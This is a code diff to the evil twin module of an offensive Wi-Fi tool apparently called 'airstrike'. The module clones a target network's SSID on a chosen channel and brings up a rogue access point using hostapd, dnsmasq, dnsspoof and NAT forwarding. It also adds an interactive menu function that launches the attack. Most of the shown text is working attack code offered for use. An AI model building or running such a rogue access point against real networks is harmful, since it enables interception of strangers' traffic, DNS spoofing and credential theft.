@@ -2,6 +2,7 @@
 import os
 import subprocess
 import threading
+
 temp_dir = '/tmp/airstrike_evil_twin'
 
 HOSTAPD_CONF = os.path.join(temp_dir, 'hostapd.conf')
@@ -44,7 +45,7 @@ listen-address=127.0.0.1
 """)
 
     def start(self):
-        # bring interface up
+        # bring the interface up in monitor/AP mode
         subprocess.run(['sudo', 'ip', 'link', 'set', self.interface, 'up'], check=True)
         subprocess.run(['sudo', 'ip', 'addr', 'add', '192.168.1.1/24', 'dev', self.interface], check=True)
         # enable IP forwarding & NAT
@@ -59,16 +60,50 @@ listen-address=127.0.0.1
         self.dnsspoof_proc = subprocess.Popen(['sudo', 'dnsspoof', '-i', self.interface])
 
     def stop(self):
+        # terminate subprocesses
         for proc in (self.dnsspoof_proc, self.dnsmasq_proc, self.hostapd_proc):
             if proc:
                 proc.terminate()
-        # restore iptables and interface
+        # restore iptables and forwarding
         subprocess.run(['sudo', 'iptables', '-t', 'nat', '-D', 'POSTROUTING', '-o', 'eth0', '-j', 'MASQUERADE'])
         subprocess.run(['sudo', 'iptables', '-D', 'FORWARD', '-i', self.interface, '-j', 'ACCEPT'])
         subprocess.run(['sudo', 'sysctl', '-w', 'net.ipv4.ip_forward=0'], check=True)
         subprocess.run(['sudo', 'ip', 'link', 'set', self.interface, 'down'], check=True)
+        # clean up temp files
         if os.path.isdir(temp_dir):
-            for f in os.listdir(temp_dir): os.remove(os.path.join(temp_dir,f))
+            for f in os.listdir(temp_dir):
+                os.remove(os.path.join(temp_dir, f))
             os.rmdir(temp_dir)
 
+# Integration in main.py (example snippet)
+# at the top of main.py:
+# from attacks.evil_twin import EvilTwin
 
+# extend your main_menu with an option:
+# print("4. Evil Twin Attack")
+# and handle it:
+# elif choice == "4":
+#     evil_twin_menu()
+
+# Define the menu function:
+
+def evil_twin_menu():
+    print("\n" + "="*40)
+    print("Evil Twin Attack")
+    print("="*40)
+    # ensure the base interface (e.g., 'wlan0') is in monitor mode
+    set_monitor_mode(interface)
+    ssid = input("Enter SSID to clone: ").strip()
+    channel = input("Enter channel number: ").strip()
+    # use the same 'interface' variable (no 'mon' suffix needed)
+    et = EvilTwin(interface, ssid, channel)
+    et.prepare()
+    print("Starting Evil Twin... Press Ctrl+C to stop.")
+    et.start()
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print("\nStopping Evil Twin...")
+        et.stop()
+        set_managed_mode(interface)
